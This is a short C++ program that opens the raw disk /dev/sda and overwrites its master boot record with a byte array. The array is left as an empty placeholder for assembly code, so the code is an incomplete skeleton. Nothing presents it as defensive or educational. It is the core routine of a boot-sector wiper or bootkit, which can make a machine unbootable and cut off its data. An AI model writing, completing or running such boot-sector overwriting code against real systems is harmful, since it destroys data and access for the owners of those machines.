#include <iostream>
#include <fstream>
#include <cstring>

int main() {
    // opens the mbr file
    std::fstream mbrFile("/dev/sda", std::ios::in | std::ios::out | std::ios::binary);

    if (!mbrFile) {
        std::cerr << "MBR file could not be opened." << std::endl;
        return 1;
    }

    // mbr will be overwritten with this
    unsigned char mbrCode[] = {
        // asm code
    };

    // write given code into the mbr
    mbrFile.write(reinterpret_cast<const char*>(mbrCode), sizeof(mbrCode));

    if (!mbrFile) {
        std::cerr << "could not write the MBR. Admin privileges?." << std::endl;
        return 1;
    }

    std::cout << "Successfully overwritten." << std::endl;

    // closes file
    mbrFile.close();

    return 0;
}
